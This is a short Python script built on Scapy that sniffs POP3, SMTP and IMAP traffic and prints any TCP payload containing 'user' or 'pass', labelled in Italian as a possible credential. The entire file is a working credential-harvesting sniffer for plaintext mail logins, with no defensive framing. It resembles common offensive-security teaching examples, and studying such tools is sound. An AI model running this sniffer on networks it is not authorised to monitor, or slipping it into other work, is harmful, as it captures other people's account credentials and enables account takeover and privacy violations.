from scapy.all import *
from scapy.layers.inet import TCP


def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Possibile credenziale: %s" % mail_packet)

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)
